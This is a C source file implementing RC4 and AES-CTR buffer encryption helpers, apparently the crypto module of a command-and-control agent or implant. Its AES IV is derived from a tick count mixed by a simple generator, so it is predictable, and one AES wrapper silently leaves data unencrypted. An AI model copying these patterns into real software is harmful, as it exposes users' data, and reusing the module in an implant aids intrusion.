#include "Crypt.h"
#include "aes.h"
#include "ApiLoader.h"
#include "utils.h"

// RC4 implementation (kept for backward compatibility)
void EncryptRC4(unsigned char* data, int dataLength, unsigned char* key, int keyLength)
{
    unsigned char S[256];
    int i, j = 0;
    unsigned char tmp;

    for (i = 0; i < 256; i++) {
        S[i] = (unsigned char)i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLength]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    i = 0; j = 0;
    for (int k = 0; k < dataLength; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

void DecryptRC4(unsigned char* data, int dataLength, unsigned char* key, int keyLength)
{
    EncryptRC4(data, dataLength, key, keyLength);
}

void AesCtrEncryptBuffer(BYTE* data, ULONG dataLen, const BYTE* key, int keyLen, const BYTE* iv, int ivLen)
{
    if (!data || dataLen == 0 || !key || keyLen != 16)
        return;

    BYTE ivBuf[16] = {0};
    if (iv && ivLen > 0) {
        ULONG copyLen = (ULONG)ivLen < 16 ? (ULONG)ivLen : 16;
        memcpy(ivBuf, iv, copyLen);
    }

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, ivBuf);
    AES_CTR_xcrypt_buffer(&ctx, data, dataLen);
}

BOOL AesCtrEncryptAlloc(const BYTE* plaintext, ULONG plainLen, const BYTE* key, int keyLen, BYTE** outBuf, ULONG* outLen)
{
    if (!plaintext || plainLen == 0 || !key || keyLen != 16 || !outBuf || !outLen)
        return FALSE;

    ULONG totalLen = 16 + plainLen;
    BYTE* buf = (BYTE*)MemAllocLocal(totalLen);
    if (!buf)
        return FALSE;

    // Generate random IV using tick count and simple mixing
    DWORD tick = ApiWin->GetTickCount();
    for (int i = 0; i < 16; i++) {
        buf[i] = (BYTE)(tick ^ (i * 7919) ^ (i << 3) ^ ((tick >> (i % 8)) & 0xFF));
        tick = tick * 1103515245 + 12345;
    }

    memcpy(buf + 16, plaintext, plainLen);
    AesCtrEncryptBuffer(buf + 16, plainLen, key, keyLen, buf, 16);

    *outBuf = buf;
    *outLen = totalLen;
    return TRUE;
}

BOOL AesCtrDecryptInPlace(BYTE* data, ULONG dataLen, const BYTE* key, int keyLen, BYTE** outPlain, ULONG* outPlainLen)
{
    if (!data || dataLen <= 16 || !key || keyLen != 16 || !outPlain || !outPlainLen)
        return FALSE;

    AesCtrEncryptBuffer(data + 16, dataLen - 16, key, keyLen, data, 16);
    *outPlain = data + 16;
    *outPlainLen = dataLen - 16;
    return TRUE;
}

void CryptoEncryptBuffer(BYTE* data, ULONG dataLen, const BYTE* key, int keyLen, int cryptoType)
{
    if (cryptoType == CRYPTO_AES) {
        // For AES, caller must have prepended IV; encrypt data starting after IV
        // This is a no-op wrapper for the in-place case - callers should use AesCtrEncryptBuffer directly
        // or use CryptoEncryptAlloc for new allocations
    } else {
        EncryptRC4(data, dataLen, (unsigned char*)key, keyLen);
    }
}

BOOL CryptoEncryptAlloc(const BYTE* plaintext, ULONG plainLen, const BYTE* key, int keyLen, int cryptoType, BYTE** outBuf, ULONG* outLen)
{
    if (!plaintext || plainLen == 0 || !key || keyLen != 16 || !outBuf || !outLen)
        return FALSE;

    if (cryptoType == CRYPTO_AES) {
        return AesCtrEncryptAlloc(plaintext, plainLen, key, keyLen, outBuf, outLen);
    } else {
        BYTE* buf = (BYTE*)MemAllocLocal(plainLen);
        if (!buf)
            return FALSE;
        memcpy(buf, plaintext, plainLen);
        EncryptRC4(buf, plainLen, (unsigned char*)key, keyLen);
        *outBuf = buf;
        *outLen = plainLen;
        return TRUE;
    }
}

BOOL CryptoDecryptInPlace(BYTE* data, ULONG dataLen, const BYTE* key, int keyLen, int cryptoType, BYTE** outPlain, ULONG* outPlainLen)
{
    if (!data || !key || keyLen != 16 || !outPlain || !outPlainLen)
        return FALSE;

    if (cryptoType == CRYPTO_AES) {
        return AesCtrDecryptInPlace(data, dataLen, key, keyLen, outPlain, outPlainLen);
    } else {
        DecryptRC4(data, dataLen, (unsigned char*)key, keyLen);
        *outPlain = data;
        *outPlainLen = dataLen;
        return TRUE;
    }
}

#include "Agent.h"
extern Agent* g_Agent;

int GetCurrentCryptoType(void)
{
    return g_Agent ? g_Agent->config->crypto_type : CRYPTO_AES;
}
